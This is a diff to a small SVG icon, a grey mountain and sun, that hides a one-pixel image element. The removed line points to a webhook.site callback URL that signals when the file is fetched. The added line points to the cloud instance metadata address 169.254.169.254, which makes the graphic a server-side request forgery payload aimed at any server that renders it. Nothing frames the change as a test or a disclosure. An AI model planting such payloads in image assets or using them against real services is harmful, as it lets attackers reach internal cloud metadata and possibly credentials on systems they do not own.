@@ -1,5 +1,5 @@
 <svg width="88" height="71" viewBox="0 0 88 71" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image x="0" y="0" width="1" height="1" xlink:href="https://webhook.site/5a271c23-c937-4cb6-be4b-d4454fcfae31" />
+  <image x="0" y="0" width="1" height="1" xlink:href="http://169.254.169.254/latest/meta-data/hostname" />
   
   <path d="M8.00002 47.9999H79.9999L57.3333 21.6356L42 31.2226L30 13.8461L8.00002 47.9999Z" fill="#4C505D"/>
   <circle cx="54.6146" cy="6.92306" r="6.92306" fill="#4C505D"/>
